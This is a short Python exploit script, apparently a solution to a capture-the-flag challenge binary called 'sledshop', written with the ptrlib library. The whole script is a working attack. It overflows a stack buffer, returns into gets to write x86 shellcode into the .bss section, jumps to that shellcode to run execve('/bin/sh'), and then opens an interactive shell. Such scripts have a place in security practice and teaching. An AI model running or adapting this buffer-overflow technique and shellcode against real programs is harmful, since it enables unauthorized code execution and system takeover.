from ptrlib import *

elf = ELF("./443fc1af632011028063e52ee67e68447bf8764e29d0f24ecf388c2e69e57522_sledshop")
sock = Process("./443fc1af632011028063e52ee67e68447bf8764e29d0f24ecf388c2e69e57522_sledshop")

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

plt_gets = 0x080483d0

payload = b'A' * 0x50
payload += p32(plt_gets)
payload += p32(elf.symbol("__bss_start"))
payload += p32(elf.symbol("__bss_start"))

sock.recvuntil("like?")
sock.sendline(payload)

sock.send(shellcode)

sock.interactive()
